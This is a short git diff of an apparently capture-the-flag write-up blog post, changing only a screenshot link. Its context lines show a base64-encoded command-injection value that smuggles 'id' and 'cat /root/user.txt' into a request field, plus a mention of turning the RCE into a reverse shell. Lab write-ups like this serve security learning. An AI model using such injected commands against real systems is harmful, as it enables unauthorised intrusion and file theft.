@@ -133,7 +133,7 @@ By sending arbitrary code, we can achieve user.txt.
 check=aHR0cDtpZDtjYXQgL3Jvb3QvdXNlci50eHQgIyA=
 # http;id;cat /root/user.txt # 
 {% endhighlight %}
-![placeholder](https://inar1.github.io/public/images/2019-03-19/2019-03-19-13-16-40.png)
+![placeholder](https://inar1.github.io/public/images/2019-03-19/2019-03-19-10-09-46.png)
 
 ### Getting Root
 By taking advantage of this RCE, we can easily achieve reverse shell.
